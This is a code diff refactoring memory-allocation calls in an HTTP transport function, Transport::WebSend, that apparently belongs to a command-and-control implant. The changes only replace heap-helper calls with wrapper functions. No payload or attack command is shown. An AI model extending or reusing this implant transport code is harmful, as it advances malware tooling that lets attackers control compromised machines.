@@ -90,7 +90,7 @@ auto DECLFN Transport::WebSend(
         if (Success) {
             RespSize = ContentLength;
             if (RespSize > 0) {
-                RespBuffer = PTR(Self->Hp->Alloc(RespSize + 1)); // +1 para null terminator
+                RespBuffer = PTR(hAlloc(RespSize + 1)); // +1 para null terminator
                 if (!RespBuffer) { 
                     KhDbg("Failed to allocate response buffer");
                     goto _KH_END;
@@ -99,7 +99,7 @@ auto DECLFN Transport::WebSend(
                 Self->Wininet.InternetReadFile(hRequest, RespBuffer, RespSize, &BytesRead);
                 if (BytesRead != RespSize) {
                     KhDbg("Read %d bytes, expected %zu", BytesRead, RespSize);
-                    Self->Hp->Free(RespBuffer);
+                    hFree(RespBuffer);
                     RespBuffer = NULL;
                     goto _KH_END;
                 }
@@ -111,7 +111,7 @@ auto DECLFN Transport::WebSend(
                 KhDbg("last error: %d", KhGetError);
             }
 
-            TmpBuffer = PTR(Self->Hp->Alloc(BEG_BUFFER_LENGTH));
+            TmpBuffer = PTR(hAlloc(BEG_BUFFER_LENGTH));
             if (!TmpBuffer) {
                 KhDbg("Failed to allocate temporary buffer");
                 goto _KH_END;
@@ -119,7 +119,7 @@ auto DECLFN Transport::WebSend(
 
             const SIZE_T MAX_RESPONSE_SIZE = 10 * 1024 * 1024; // 10MB limite
             RespCapacity = BEG_BUFFER_LENGTH;
-            RespBuffer = PTR(Self->Hp->Alloc(RespCapacity));
+            RespBuffer = PTR(hAlloc(RespCapacity));
             if (!RespBuffer) {
                 KhDbg("Failed to allocate initial response buffer");
                 goto _KH_END;
@@ -136,7 +136,7 @@ auto DECLFN Transport::WebSend(
                         break;
                     }
 
-                    PVOID newBuffer = PTR(Self->Hp->ReAlloc(RespBuffer, newCapacity));
+                    PVOID newBuffer = PTR(hReAlloc(RespBuffer, newCapacity));
                     if (!newBuffer) {
                         KhDbg("Failed to reallocate response buffer");
                         break;
@@ -151,13 +151,13 @@ auto DECLFN Transport::WebSend(
             } while (BytesRead > 0);
 
             if (TmpBuffer) {
-                Self->Hp->Free(TmpBuffer);
+                hFree(TmpBuffer);
                 TmpBuffer = NULL;
             }
 
             if (!Success) {
                 if (RespBuffer) {
-                    Self->Hp->Free(RespBuffer);
+                    hFree(RespBuffer);
                     RespBuffer = NULL;
                     RespSize = 0;
                 }
@@ -173,13 +173,13 @@ auto DECLFN Transport::WebSend(
     }
 
 _KH_END:
-    if (TmpBuffer) Self->Hp->Free(TmpBuffer);
+    if (TmpBuffer) hFree(TmpBuffer);
     if (hRequest) Self->Wininet.InternetCloseHandle(hRequest);
     if (hConnect) Self->Wininet.InternetCloseHandle(hConnect);
     if (hSession) Self->Wininet.InternetCloseHandle(hSession);
 
     if (!Success && RespBuffer) {
-        Self->Hp->Free(RespBuffer);
+        hFree(RespBuffer);
         if (RecvData) *RecvData = NULL;
         if (RecvSize) *RecvSize = 0;
     }
